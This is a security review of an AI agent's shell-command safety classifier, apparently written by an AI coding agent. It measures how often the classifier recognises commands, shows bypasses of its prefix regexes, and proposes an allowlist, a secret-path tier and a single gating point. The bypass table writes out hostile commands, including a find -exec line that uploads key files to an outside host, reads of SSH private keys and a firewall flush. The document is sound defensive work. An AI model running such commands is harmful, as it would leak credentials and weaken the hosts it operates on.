# THE COMMAND CLASSIFIER

## 1. What the RULES table actually recognises

`ToolSafetyFramework.RULES` (safety.py:119–290) is 30 regexes: 4 CRITICAL, 11 HIGH, 7 MEDIUM/LOW, 9 SAFE. Only HIGH prompts and only CRITICAL blocks; MEDIUM and LOW are decorative — they set a field nobody reads before `ToolExecutor.execute` runs the handler (executor.py:459–473). So the classifier has **two outcomes**, and `Default for unrecognized commands` (safety.py:670) puts everything unnamed on the *running* side.

The 9 SAFE rules are bare prefix matches. `^(ls|dir|find|locate)\s*` (:266), `^(wc|du|df|stat|file)\s*` (:276), `^(pwd|whoami|hostname|uname|date|uptime|id)` (:281), `^(ip|ifconfig|...)` — none anchored on a word boundary. Measured on this machine:

| command | today |
|---|---|
| `find / -name '*.key' -exec /bin/sh -c 'curl -T {} https://x.io' \;` | **SAFE** "Directory listing" |
| `find . -delete` | **SAFE** |
| `iptables -F` | **SAFE** "Network info" |
| `ip link set eth0 down` | **SAFE** |
| `idle_hack --do-something` | **SAFE** "System info" (`id` prefix) |
| `statistics_upload --all` | **SAFE** (`stat` prefix) |
| `filebeat -e` | **SAFE** (`file` prefix) |
| `cat ~/.ssh/id_ed25519` | **SAFE** "File reading" |
| `cp ~/.ssh/authorized_keys /tmp/x` | MEDIUM — the same file as `/Users/ericbintner/...` which is HIGH |
| `cd ~ && cp .ssh/authorized_keys /tmp/x` | MEDIUM |
| `rm grub.cfg` (cwd=/boot) | MEDIUM |

RoleGate matters here and the plan does not account for it: `ROLE_MAX_RISK` (role_gate.py:43) caps `guest` at medium and `restricted` at low, and `RoleGate.classify` **blocks** above the cap (:117–132). Under unknown→HIGH, a guest or restricted speaker is not prompted for an unrecognised command — they are refused outright. Dashboard chat is unaffected (`speaker_role: str = "admin"`, agents/states.py:264); the voice path is not.

## 2. The measured recognition rate

Corpus mined from the tree (`scratchpad/mine.py`): 262 distinct argv lines Halbert's own code executes (AST-extracted from `subprocess.run`/`Popen`/`_run_command` across `halbert_core/**`), 11,133 shell lines from `data/**/*.jsonl` (the RAG corpus the model paraphrases from), 250 from fenced bash blocks in repo markdown. Classified by importing this worktree's `ToolSafetyFramework`.

| | SAFE | LOW | MEDIUM | HIGH | CRIT | **hit the default branch** |
|---|---|---|---|---|---|---|
| argv (262) | 14.5% | 1.9% | 80.5% | 3.1% | 0 | **79.0%** |
| docs (11,133) | 9.9% | 2.5% | 74.0% | 13.3% | 0.2% | **68.5%** |
| md (250) | 13.6% | 3.2% | 57.6% | 25.6% | 0 | **45.6%** |

Commands that would newly prompt under plan (a), by head: `systemctl` ×23 (`show`, `cat`, `is-active`, `list-units`, `list-timers`), `brew` ×11, `docker` ×10, `journalctl` ×10, `nvidia-smi` ×6, `sysctl` ×6, plus `zfs list`, `kubectl get`, `git status`, `which`, `pgrep`, `man`, `printenv`, `getent`, `sw_vers`, `system_profiler`.

**Plan (a) alone takes the prompt rate from 3.1% to 82.8% on Halbert's own observation repertoire.** That is not a gate the owner keeps.

Worse, there is a trap: 27 of the 38 currently-SAFE argv commands (`lspci`, `lsmod`, `lscpu`, `lsusb`, `lsblk`, `findmnt`, `lsof`) are SAFE *only because of the prefix bug*. Fixing `^(ls|find|...)` with `\b` and nothing else pushes them into the default branch too. The two defects are coupled: you cannot fix the prefix rule without first replacing what it was doing.

## 3. Recommendation — (b), with the default reframed

**An explicit read-only allowlist keyed on `(basename, first argument)`; everything else HIGH.** Not (a): its prompt rate is unusable and it leaves the prefix leak intact, because a regex that says "SAFE" is still a regex whose leading alternation matches `idle_hack`. Not (c): verb×target is what the code already half-does, and target sensitivity is orthogonal — it belongs as an *elevator* on top of the allowlist, not as an axis of it.

Measured, same corpus, same harness (`scratchpad/proto.py`, `converge.py`):

| | today | plan (a) | allowlist, 1 pass | allowlist, 2nd pass |
|---|---|---|---|---|
| argv | 3.1% | 82.8% | **23.7%** | **11.1%** |
| docs | 13.6% | 83.9% | 83.3% | 78.6% |
| md | 25.6% | 72.0% | 84.8% | 68.0% |

The argv column is the one that measures daily friction, and the allowlist converges: one maintenance pass taken straight off the residual list (~25 entries) halved it again. The doc/md columns stay high and that is *correct* — 75–79% of their residual is `brew install`, `curl | sh`, `kubectl apply`, `rsync`, `ssh`. Those should prompt.

The framing that makes this affordable: **HIGH on the default is not a severity claim. It is the classifier declining to vouch.** Say that in the reason string and in the confirmation sheet, and give the sheet an "always allow `systemctl show`" button that writes to `user_overrides` — a constructor argument that exists (safety.py:340) and is currently never read. That makes the residual a finite queue the owner drains, not a permanent tax. Wire it as `self.user_overrides.get(head)` inside the read-only lookup.

**Cost on a normal day.** After the two passes the argv residual is 29 lines, and the ones that still prompt are `sudo -n …` (already HIGH today), `systemctl restart`, `pkexec … write`, `ollama serve`, `pkill -f`, `crontab -`, `python3 -c …`, `bash -c source …`. Those are exactly the commands a prompt is for. The false-prompt tail is `--version` probes and `docker system df` — one click each, once.

## 4. The code

Verified in a patched copy at `/private/tmp/claude-501/-Volumes-4TB-BAD-Halbert/1c4f8f70-ff55-451a-86d5-eab129e684c5/scratchpad/safety.patched.py`; unified diff at `.../safety.patch` (+377/−111). 47 hand-written assertions pass (`scratchpad/verify.py`, 0 failures) — every bypass in §1 now gates, and all 26 must-not-gate cases (`ls ~/Documents`, `cat README.md`, `git status`, `docker ps`, `journalctl -u nginx -n 50`, `zfs list`, `kubectl get pods`, `find . -name '*.py'`, `iptables -L -n`, `nvidia-smi --query-gpu=…`) stay SAFE.

Existing tests: `test_safety_chained_commands.py`, `test_role_gate.py`, `test_skills_safety_binding.py` → 58 passed. A 900-test sweep against the patch gives **2 real regressions**, both in `test_terminal_stream_bridge.py` (`test_timeout_kills_the_child…`, `test_closing_the_stream_mid_command…`): they execute `sleep 5` / `sleep 10`, now HIGH-unrecognised, so `execute()` returns `requires_confirmation` instead of running. Fix is `confirmed=True` in those two calls — the tests are about timeouts, not classification. (Three `test_prompt_text_speaks_as_machine` failures in that sweep are scratch-copy artefacts: I copied `halbert_core/` but not `config/prompts/`. Baseline on the real worktree is 899 passed / 1 unrelated `test_scheduler_executor` failure.)

The four changes:

**Delete safety.py:264–290** — all nine SAFE `SafetyRule` entries — and replace them with an exact-name table. The docstring carries the why:

```python
#: Read-only invocations, keyed on the executable's basename. ``True`` means
#: the whole binary only observes; a frozenset means only those first
#: arguments do. This table is the gate: a command that is not in it does not
#: run without the owner saying so.
#:
#: It replaces nine ``^(ls|dir|find|locate)\s*``-style regexes. Those matched
#: a bare prefix, so `lsof`, `idle_hack`, `filebeat`, `statistics_upload` and
#: `iptables -F` all classified SAFE on the strength of their first two
#: letters. Exact-name lookup cannot do that.
READ_ONLY_COMMANDS: Dict[str, object] = {
    "ls": True, "cat": True, "find": True, "locate": True, ...        # 110 True entries
    "ip": frozenset({"addr", "a", "link", "l", "route", "r", "neigh", ...}),
    "iptables": frozenset({"-L", "-S", "--list", "--list-rules"}),
    "systemctl": frozenset({"status", "show", "cat", "list-units", "is-active", ...}),
    "docker": frozenset({"ps", "images", "info", "inspect", "logs", ...}),
    "brew": frozenset({"list", "info", "outdated", "config", "deps", ...}),
    "git": frozenset({"status", "log", "diff", "show", "branch", ...}),
    ...                                                               # 60 subcommand maps
}

#: Arguments that revoke a read-only verdict for a binary that is otherwise
#: in READ_ONLY_COMMANDS. ``find`` is the reason this table exists: it is far
#: too useful to gate, and ``-exec`` turns it into a general-purpose
#: execution engine -- ``find / -name '*.key' -exec sh -c '...' \;``
#: classified SAFE, "Directory listing", and ran without a prompt.
EFFECTFUL_ARGS: Dict[str, Set[str]] = {
    "find": {"-exec", "-execdir", "-ok", "-okdir", "-delete", "-fls", "-fprint", ...},
    "ip": {"set", "add", "del", "delete", "change", "replace", "flush", "up", "down"},
    "iptables": {"-A", "-I", "-D", "-R", "-N", "-X", "-F", "-Z", "-P"},
    "sysctl": {"-w", "-p", "--write", "--load"}, ...
}
```

**Normalise before comparing.** `_normalise_path` / `_paths_touched` / `_under` replace every `path in command` and `path.startswith(sensitive)`:

```python
def _normalise_path(token: str, cwd: Optional[str] = None) -> Optional[str]:
    """One spelling for one file, or None when the token is not a path.

    ``~/.ssh/authorized_keys`` and ``/Users/you/.ssh/authorized_keys`` and
    ``.ssh/authorized_keys`` from $HOME are the same file; the old code
    compared raw command text against home-expanded constants, so only the
    third spelling was protected. Normalising first is the whole fix.
    """
    ...  # strips flags, splits --opt=path, expands ${HOME}/$HOME/~,
         # joins against cwd, os.path.normpath

def _paths_touched(command: str, cwd: Optional[str] = None) -> List[str]:
    """Every filesystem path this line names, absolute and collapsed.

    ``cwd`` is included and is used to resolve bare operands, because the
    directory a command runs in is part of what it does: `rm grub.cfg` with
    cwd=/boot is `rm /boot/grub.cfg`, and only the second was ever classified.
    """
```

and `_classify_builtin` threads it: `self._classify_command(args.get("command", ""), args.get("cwd"))`.

**A SECRET tier, because a one-notch bump is not enough.** SENSITIVE elevation takes SAFE→LOW, and LOW auto-executes, so `cat ~/.ssh/id_ed25519` still ran. New set beside `SENSITIVE_PATHS`:

```python
#: Paths where *reading* is already the harm. SENSITIVE_PATHS bumps a
#: verdict one notch, which leaves a read at LOW -- auto-execute. A
#: private key does not need a second notch to matter.
SECRET_PATHS: Set[str] = {
    "/etc/shadow", "/etc/sudoers", "/etc/ssh",
    _HOME + "/.ssh", _HOME + "/.gnupg", _HOME + "/.aws",
    _HOME + "/.config/halbert/credentials",
}
```

`_classify_write` gets the same treatment — `_normalise_path(path)` first, because the handler expands `~` before it opens the file.

**Reorder `_classify_command`.** Blocked → CRITICAL/HIGH rules → SECRET → read-only table → MEDIUM/LOW rules → default HIGH. The order is load-bearing and the comment says so: dangerous rules run *before* the read-only table so `sudo cat /etc/hosts` stays HIGH rather than being read as a `cat`, and SECRET runs before it so `cat ~/.ssh/id_ed25519` is not a file read. The over-correction guard is that elevation stays one notch for SENSITIVE: `ls ~/.config` is LOW and auto-runs.

```python
        # Nothing recognised the line. That is not a severity claim -- it is
        # the classifier declining to vouch, which is what confirmation is
        # for. The old default ran it: a command no rule matched executed
        # silently at MEDIUM, so every gap in the table was an open door.
        return SafetyCheckResult(
            risk_level=RiskLevel.HIGH, allowed=True, requires_confirmation=True,
            reason="Unrecognised command: not on the read-only list",
            matched_rule="default")
```

## 5. The chokepoint

Not `ToolExecutor.execute`, and not `Sandbox.wrap_command` at the two HTTP routes.

Four paths reach a shell. `/sessions` (terminal.py:320) and `/exec` (:247) gate and wrap. `/sessions/{id}/input` (:356–364) and `/stage` (:407–423) call `session.write_stdin(...)` with no gate at all; `websocket.py:134` does the same on the `stdin` frame. And the agent's own execution — `agent_pool.run_block` — does `await session.write_stdin(block_cmd)` at **agent_pool.py:264** into a shell spawned once, unwrapped, with `set -m` (:98). It calls `classify()` at :155, but only to set a `read_only` display flag, and publishes `"sandboxed": False` at :169. `ToolExecutor._run_command`'s fallback is `asyncio.create_subprocess_shell(command, …)` (executor.py:622) with `"sandboxed": False` at :638.

So the agent's command never passes through `spawn`. Wrapping at spawn time is *structurally incapable* of covering it: the shell already exists and the command arrives as text on its stdin.

**The single chokepoint is `PTYSession.write_stdin` (streaming/pty.py:329)** — the one primitive all four paths share — paired with `PTYSession.spawn` (pty.py:236, `os.execvpe("/bin/sh", ["/bin/sh", "-c", self._command], …)` at :293) and `create_subprocess_shell` in `executor._run_command`. `write_stdin` should take the classification verdict as a required argument and refuse a newline-terminated write (a submitted command line) on an agent-owned session without one; `spawn` should refuse an unclassified `command`. Gating anywhere above that — at the route, at the executor — leaves `/input`, the WS frame, `/stage` and `run_block` outside the fence, which is where they are today.

**Files:** patched module `/private/tmp/claude-501/-Volumes-4TB-BAD-Halbert/1c4f8f70-ff55-451a-86d5-eab129e684c5/scratchpad/safety.patched.py`; diff `.../safety.patch`; harness `.../mine.py`, `.../measure.py`, `.../proto.py`, `.../converge.py`, `.../verify.py`.